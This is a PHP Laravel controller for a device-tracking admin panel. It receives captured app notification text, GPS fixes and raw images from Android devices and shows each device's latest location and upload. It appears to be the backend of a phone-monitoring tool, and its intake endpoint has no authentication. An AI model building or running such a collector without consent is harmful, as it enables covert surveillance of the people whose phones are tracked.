<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller;
use App\Models\Device;
use App\Models\DeviceLog;
use App\Models\Notification;
use App\Models\Upload;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;

class TrackingController extends Controller
{
    public function index()
    {
        return view('admin-banceuy.tracking');
    }

    public function store(Request $r)
    {
        Log::info("REQUEST IN", $r->all());

        // ================= DEVICE FIX (TIDAK MERUSAK FLOW LAIN) =================
        $deviceId = $r->input('device_id') ?? $r->header('device_id');
        $androidId = $r->input('android_id') ?? $r->header('android_id');

        if (!$deviceId || !$androidId) {
            return response()->json(['error' => 'invalid device'], 400);
        }

        $device = Device::firstOrCreate(
            ['device_id' => $deviceId],
            ['android_id' => $androidId]
        );

        // ================= NOTIF (TIDAK DIUBAH) =================
        $title = $r->input('notif_title');
        $text  = $r->input('notif_text');

        Log::info("NOTIF RECEIVED", [$title, $text]);

        if (!empty($title) || !empty($text)) {

            Notification::create([
                'device_id' => $device->id,
                'type' => 'app',
                'message' => trim($title . ' ' . $text)
            ]);
        }

        // ================= GPS (TIDAK DIUBAH) =================
        if ($r->filled('lat') && $r->filled('lon')) {

            $lat = floatval($r->lat);
            $lon = floatval($r->lon);

            Log::info("GPS RECEIVED", [$lat, $lon]);

            if ($lat == 0 || $lon == 0) {
                return response()->json(['skip' => 'invalid gps']);
            }

            $last = DeviceLog::where('device_id', $device->id)
                ->latest()
                ->first();

            if ($last && now()->diffInSeconds($last->created_at) < 5) {
                return response()->json(['skip' => 'too fast']);
            }

            if ($last && $last->lat == $lat && $last->lon == $lon) {
                return response()->json(['skip' => 'duplicate']);
            }

            DeviceLog::create([
                'device_id' => $device->id,
                'lat' => $lat,
                'lon' => $lon
            ]);
        }

        // ================= IMAGE (FULL FIXED ONLY HERE) =================

        $type = $r->header('X-Type');

        if ($type === 'image') {

            Log::info("IMAGE RECEIVED");

            $raw = $r->getContent();

            if (!$raw || strlen($raw) < 500) {
                Log::warning("EMPTY OR INVALID IMAGE");
                return response()->json(['error' => 'invalid image'], 400);
            }

            $fileName = 'img_' . time() . '.jpg';

            $dir = storage_path('app/public/uploads');

            if (!file_exists($dir)) {
                mkdir($dir, 0777, true);
            }

            $fullPath = $dir . '/' . $fileName;

            file_put_contents($fullPath, $raw);

            $imgInfo = @getimagesize($fullPath);

            if ($imgInfo === false) {
                unlink($fullPath);
                return response()->json(['error' => 'invalid image'], 400);
            }

            Upload::create([
                'device_id' => $device->id,
                'file_path' => 'uploads/' . $fileName,
                'original_name' => $fileName
            ]);

            Log::info("IMAGE SAVED SUCCESS");
        }
        
        return response()->json([
            'ok' => true
        ]);
    }

    public function devices()
    {
        return Device::all()->map(function ($d) {

            $last = $d->logs()->latest()->first();
            $img  = $d->uploads()->latest()->first();

            return [
                'device_id' => $d->device_id,
                'android_id' => $d->android_id,
                'lat' => $last->lat ?? null,
                'lon' => $last->lon ?? null,
                'image' => $img ? asset('storage/' . $img->file_path) : null,
            ];
        });
    }

    public function live()
    {
        $devices = Device::with([
            'logs' => function ($q) {
                $q->latest()->limit(1);
            },
            'uploads' => function ($q) {
                $q->latest()->limit(1);
            }
        ])->get();

        $data = $devices->map(function ($d) {

            $log = $d->logs->first();
            $upload = $d->uploads->first();

            return [
                'device_id' => $d->device_id,
                'android_id' => $d->android_id,
                'lat' => $log->lat ?? null,
                'lon' => $log->lon ?? null,
                'last_upload' => $upload ? $upload->created_at->format('d M Y H:i:s') : null,
            ];
        });

        return response()->json($data);
    }
}
